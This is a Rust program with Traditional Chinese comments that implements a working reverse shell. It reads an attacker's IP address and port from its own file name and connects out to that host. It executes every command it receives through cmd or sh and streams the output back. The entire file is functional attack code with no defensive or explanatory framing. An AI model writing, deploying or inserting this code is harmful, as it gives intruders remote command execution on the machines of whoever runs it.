use std::env;
use std::fs;
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::io::{self, Write, Read};
use std::path::Path;

fn main() -> io::Result<()> {
    // 取得當前執行檔案的名稱
    let current_exe = env::current_exe()?;
    let filename = current_exe.file_name().unwrap().to_str().unwrap();

    // 將檔名解析為 IP 和 port
    let parts: Vec<&str> = filename.split('_').collect();
    let ip = format!("{}.{}.{}.{}", parts[0], parts[1], parts[2], parts[3]);
    let port = parts[4];

    // 組合成連線地址
    let address = format!("{}:{}", ip, port);

    // 嘗試連線到指定地址
    if let Ok(mut stream) = TcpStream::connect(&address) {
        // 連線成功，進行交互式 shell
        loop {
            let mut buffer = [0; 1024];
            // 從 stream 讀取資料
            let n = stream.read(&mut buffer)?;

            if n == 0 {
                // 如果讀取到 EOF，則跳出迴圈
                break;
            }

            let output = if cfg!(target_os = "windows") {
                Command::new("cmd")
                    .args(&["/C", std::str::from_utf8(&buffer[..n]).unwrap()])
                    .output()
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(std::str::from_utf8(&buffer[..n]).unwrap())
                    .output()
            };

            if let Ok(output) = output {
                stream.write_all(&output.stdout)?;
                stream.write_all(&output.stderr)?;
            }
        }
    }

    Ok(())
}
